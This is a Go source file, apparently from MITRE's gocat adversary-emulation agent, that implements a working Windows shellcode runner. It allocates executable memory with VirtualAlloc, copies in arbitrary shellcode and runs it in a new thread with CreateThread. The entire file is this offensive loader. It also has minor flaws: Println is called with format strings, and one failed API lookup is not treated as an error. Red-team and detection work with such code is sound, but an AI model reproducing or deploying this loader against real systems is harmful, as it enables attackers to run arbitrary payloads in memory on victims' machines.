// +build windows

package shellcode

import (
	"fmt"
	"syscall"
	"unsafe"

    "golang.org/x/sys/windows"

	"github.com/mitre/gocat/execute"
    "github.com/mitre/gocat/output"
)

var (
	hKernel32       *syscall.DLL
	hNtdll          *syscall.DLL
	fpRtlCopyMemory *syscall.Proc
	fpCreateThread  *syscall.Proc
)

// Runner runner
func Runner(shellcode []byte) (bool, string) {
    // Allocate and populate RWX buffer for shellcode
    output.VerbosePrint("[*] Creating shellcode buffer")
	address, err := windows.VirtualAlloc(0, uintptr(len(shellcode)), windows.MEM_COMMIT | windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if checkErrorMessage(err) {
		return false, execute.ERROR_PID
	}

    output.VerbosePrint("[*] Populating shellcode buffer")
	_, _, err = fpRtlCopyMemory.Call(address, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if checkErrorMessage(err) {
		return false, execute.ERROR_PID
	}

    // Run shellcode in new thread
    output.VerbosePrint("[*] Running shellcode in new thread")
    var threadId uint32
    pThreadId := unsafe.Pointer(&threadId)
    hThread, _, err := fpCreateThread.Call(0, 0, address, 0, 0, uintptr(pThreadId))
    if checkErrorMessage(err) {
        return false, execute.ERROR_PID
    }
    if (hThread == 0) {
        output.VerbosePrint("[!] CreateThread returned a null handle.")
        return false, execute.ERROR_PID
    } else {
        output.VerbosePrint(fmt.Sprintf("[*] Created thread with ID %d", threadId))
    }

    // Run auxiliary go routine to wait for shellcode completion and perform cleanup
    go func() {
        defer func() {
            if result := recover(); result != nil {
                output.VerbosePrint(fmt.Sprintf("Auxiliary routine panicked: %s", result))
            }
        }()

        // Wait for shellcode to finish executing
        output.VerbosePrint("[*] Waiting for thread completion")
        waitResult, waitErr := windows.WaitForSingleObject(windows.Handle(hThread), windows.INFINITE)
        _ = windows.CloseHandle(windows.Handle(hThread))
        if checkErrorMessage(waitErr) {
            return
        } else if waitResult != windows.WAIT_OBJECT_0 {
            output.VerbosePrint(fmt.Sprintf("[!] WaitForSingleObject failed. Return value: %d", waitResult))
            return
        }

        // Free memory
        output.VerbosePrint("[*] Freeing buffer")
        err := windows.VirtualFree(address, 0, windows.MEM_RELEASE)
        if err != nil {
    		output.VerbosePrint(fmt.Sprintf("[!] Failed to free buffer: %s", err.Error()))
    	}
    }()

	return true, execute.SUCCESS_PID
}

// IsAvailable does a shellcode runner exist
func IsAvailable() bool {
	var err error
	if hKernel32, err = syscall.LoadDLL("kernel32.dll"); err != nil {
		fmt.Println("[-] Failed to load Kernel32: %s", err.Error())
		return false
	}
	if hNtdll, err = syscall.LoadDLL("ntdll.dll"); err != nil {
		fmt.Println("[!] Failed to load NTDLL: %s", err.Error())
		return false
	}
    if fpCreateThread, err = hKernel32.FindProc("CreateThread"); err != nil {
		fmt.Println("[-] Failed to load CreateThread API: %s", err.Error())
		return false
	}
	if fpRtlCopyMemory, err = hNtdll.FindProc("RtlCopyMemory"); err != nil {
		fmt.Println("[-] Failed to load RtlCopyMemory API: %s", err.Error())
	}

	fmt.Println("[+] Fetched required APIs for shellcode runner.")
	return true
}

// Check for error message
func checkErrorMessage(err error) bool {
	if err != nil && err.Error() != "The operation completed successfully." {
		output.VerbosePrint(err.Error())
		return true
	}
	return false
}
